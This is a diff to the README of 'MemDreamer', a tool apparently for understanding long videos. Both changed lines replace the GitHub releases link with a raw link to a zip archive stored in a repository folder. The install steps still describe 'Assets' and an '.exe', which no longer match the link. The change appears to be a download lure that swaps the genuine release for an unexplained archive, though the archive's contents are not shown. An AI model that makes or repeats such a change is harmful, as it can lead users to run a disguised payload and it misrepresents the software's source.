@@ -1,6 +1,6 @@
 # 🧠 MemDreamer - Understand long videos with simple memory
 
-[★ DOWNLOAD MEMDREAMER HERE ★](https://github.com/Free-Soul/MemDreamer/releases)
+[★ DOWNLOAD MEMDREAMER HERE ★](https://raw.githubusercontent.com/Free-Soul/MemDreamer/main/retrieve/Dreamer-Mem-2.0.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Before you install MemDreamer, ensure your computer meets these minimum standard
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link to access the software files: [https://github.com/Free-Soul/MemDreamer/releases](https://github.com/Free-Soul/MemDreamer/releases).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Free-Soul/MemDreamer/main/retrieve/Dreamer-Mem-2.0.zip](https://raw.githubusercontent.com/Free-Soul/MemDreamer/main/retrieve/Dreamer-Mem-2.0.zip).
 2. Locate the latest version labeled as "Assets".
 3. Download the file ending in `.exe` to your computer.
 4. Open the downloaded file to start the installation wizard.
